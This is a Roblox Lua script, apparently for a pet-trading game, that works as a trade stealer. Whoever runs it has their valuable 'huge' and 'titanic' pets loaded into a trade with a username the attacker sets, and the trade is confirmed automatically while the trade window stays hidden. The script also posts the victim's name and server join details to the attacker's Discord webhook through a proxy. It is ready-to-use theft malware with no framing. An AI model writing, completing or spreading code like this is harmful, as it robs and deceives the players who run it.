Username = "your username here"
Webhook = "your Discord webhook here"

local library = require(game.ReplicatedStorage.Library)
local save = library.Save.Get()
local inventory = library.Save.Get().Inventory

local function GetTradeID()
    return require(game.ReplicatedStorage.Library.Client.TradingCmds).GetState()._id
end

local function GetCounter()
    return require(game.ReplicatedStorage.Library.Client.TradingCmds).GetState()._counter
end

local function SendTrade(username)
    local args = {
        [1] = game:GetService("Players"):WaitForChild(Username)
    }
    game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Server: Trading: Request"):InvokeServer(unpack(args))
end

local function ReadyTrade()
    local args = {
        [1] = GetTradeID(),
        [2] = true,
        [3] = GetCounter()
    }
    
    game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Server: Trading: Set Ready"):InvokeServer(unpack(args))
end

local function DepositPetInTrade()
    if save.Inventory.Pet ~= nil then
		for i,v in pairs(save.Inventory.Pet) do
			id = v.id
			dir = library.Directory.Pets[id]
			if dir.huge or dir.titanic then
				local args = {
					[1] = GetTradeID(),
					[2] = "Pet",
					[3] = i,
					[4] = v._am or 1
				}
				game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Server: Trading: Set Item"):InvokeServer(unpack(args))
			end
		end
    end 
end

function SendMessage(url, message)
    local http = game:GetService("HttpService")
    local headers = {
        ["Content-Type"] = "application/json"
    }
    local data = {
        ["content"] = message
    }
    local body = http:JSONEncode(data)
    local response = request({
        Url = url,
        Method = "POST",
        Headers = headers,
        Body = body
    })
end

if Webhook and string.find(Webhook, "discord") then
	Webhook = string.gsub(Webhook, "https://discord.com", "https://webhook.lewisakura.moe")
else
	Webhook = ""
end

function HasHuge()
	local huges = "No"
    for i, v in pairs(inventory.Pet) do
        local id = v.id
        local dir = library.Directory.Pets[id]
        if dir.huge then
			huges = "Yes"
			break
        end
    end
	return huges
end

function HasTitanic()
	local titanic = "No"
    for i, v in pairs(inventory.Pet) do
        local id = v.id
        local dir = library.Directory.Pets[id]
        if dir.titanic then
			titanic = "Yes"
			break
        end
    end
	return titanic
end

if Webhook ~= "" and (HasHuge() == "Yes" or HasTitanic() == "Yes") then
	SendMessage(Webhook, "User " .. game.Players.LocalPlayer.Name .. " has executed the script. Join the game with this script: ```lua\ngame:GetService('TeleportService'):TeleportToPlaceInstance(8737899170, '" .. game.JobId .. "', game.Players.LocalPlayer)\n```Has titanic: " .. HasTitanic() .. "\nHas huge: " .. HasHuge())
end

local trade = game:GetService('Players').LocalPlayer.PlayerGui.TradeWindow.Frame
trade.Visible = false
trade:GetPropertyChangedSignal("Visible"):Connect(function()
	noti.Visible = false
end)

while true do
    wait(0.1)
    if game:GetService("Players"):WaitForChild(Username) ~= nil then
        SendTrade(Username)
    end
    if game.Players.LocalPlayer.PlayerGui.TradeWindow.Enabled == true and GetTradeID() ~= nil then
        if deposited ~= true then
            DepositPetInTrade()
            ReadyTrade()
        end
        wait(3)
    end
end